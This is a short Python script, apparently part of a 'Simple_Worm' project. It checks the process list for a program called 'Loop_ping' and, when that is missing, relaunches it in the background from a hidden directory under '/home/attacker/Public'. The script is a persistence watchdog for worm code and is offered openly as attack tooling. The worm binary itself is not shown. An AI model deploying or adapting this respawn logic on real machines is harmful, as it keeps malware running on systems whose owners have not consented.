import os
import subprocess
import string

program = os.popen('ps -ef | grep "Loop_ping"').read()

if program.find('/home/attacker/Public/.Simple_Worm/Loop_ping') < 0:
	os.system('/home/attacker/Public/.Simple_Worm/Loop_ping &')
	

